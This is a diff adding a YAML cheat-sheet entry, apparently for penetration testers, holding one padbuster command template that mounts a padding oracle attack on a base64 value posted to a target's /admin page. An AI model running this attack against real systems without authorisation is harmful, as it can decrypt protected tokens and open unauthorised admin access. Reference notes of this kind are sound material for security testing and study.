@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "padbuster-decrypt-base64-post.yaml"
+  tags: ["web", "cracking"]
+  created: "2025-07-10"
+  author: "@Anakles"
+
+content: |
+  padbuster http://$IP:$PORT/admin "<base64value>" 16 -encoding 0 -post <base64value> [-cookies <cookies>] [-error <canary>]
